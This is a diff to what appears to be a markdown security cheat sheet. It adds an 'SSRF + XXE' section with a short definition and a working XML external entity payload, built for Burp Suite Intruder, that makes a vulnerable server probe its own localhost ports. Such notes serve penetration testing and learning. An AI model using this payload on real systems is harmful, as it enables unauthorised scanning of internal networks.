@@ -39,4 +39,19 @@ If the server is vulnerable it executes the **xxe** entity and sends the data to
 
 
 ## SSRF + XXE
+Server side request forgery attacks occur when an attacker abuses functionality on a server, causing the server to make requests to an unintended location
 
+
+Example(using burp sutie intruder):
+*finds open ports on the victims localhost network*
+```
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "http://localhost:§NUMBER§/" >
+]>
+<contact>
+  <name>&xxe;</name>
+  <email>test@test.com</email>
+  <message>test</message>
+</contact>
+```
